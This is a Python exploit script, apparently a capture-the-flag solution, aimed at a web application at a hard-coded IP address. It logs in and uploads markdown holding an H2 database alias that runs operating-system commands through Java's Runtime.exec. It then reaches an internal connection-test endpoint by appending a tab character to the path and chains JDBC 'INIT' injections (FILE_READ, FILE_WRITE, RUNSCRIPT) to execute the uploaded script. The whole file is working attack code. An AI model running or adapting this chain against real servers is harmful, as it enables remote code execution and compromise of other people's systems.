import requests
import socket
import ssl
from urllib.parse import urlparse, urlencode
import re

URL = "http://157.10.188.17:8989"

def get_session_login(): 
    endpoint = "/login"
    data = {"username": "kou", "password": "123"}
    response = requests.post(URL+endpoint, data=data, allow_redirects=False)
    session = response.headers.get('Set-Cookie').split(";")[0]
    return session

def create_markdown(content, session):
    endpoint = "/dashboard/save"
    header = {"Cookie": session}
    data = {"content": content}
    response = requests.post(URL+endpoint, data=data, headers=header)
    if(response.status_code != 200): exit()
    match = re.search(r'portfolio_\d+\.md', response.text)
    return match[0]

def internal_inject(payload, session):
    # build path with actual tab character
    path = "/internal/testConnection" + "\t"   # đây là ký tự tab thật (0x09)

    # prepare body (form data)
    data = {"username": "kou", "password": payload}
    body = urlencode(data).encode("latin-1")  # giữ byte nguyên vẹn

    # parse URL
    parsed = urlparse(URL)
    scheme = parsed.scheme or "http"
    host = parsed.hostname
    port = parsed.port
    if not port:
        port = 443 if scheme == "https" else 80

    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: python-raw-socket",
        "Connection: close",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(body)}",
        f"Cookie: {session}",
    ]
    raw_request = "\r\n".join(headers) + "\r\n\r\n"
    raw = raw_request.encode("latin-1") + body  

    if scheme == "https":
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(raw)
                resp = b""
                while True:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
    else:
        with socket.create_connection((host, port), timeout=10) as sock:
            sock.sendall(raw)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk

    return resp.decode("latin-1", errors="replace")
    
session = get_session_login()
content="""
CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;CALL EXEC('echo ${sleep 5}');
"""
markdown_file = create_markdown(content, session)
payload_1 = f"1;INIT=CALL FILE_WRITE(FILE_READ('data/portfolios/kou/{markdown_file}'),'a.sql')"
internal_inject(payload_1, session)
payload_2 = "1;INIT=CALL FILE_WRITE(SUBSTRING(FILE_READ('a.sql') FROM 94),'a.sql')"
internal_inject(payload_2, session)
payload_3="1;INIT=RUNSCRIPT FROM 'a.sql'"
print(internal_inject(payload_3, session))
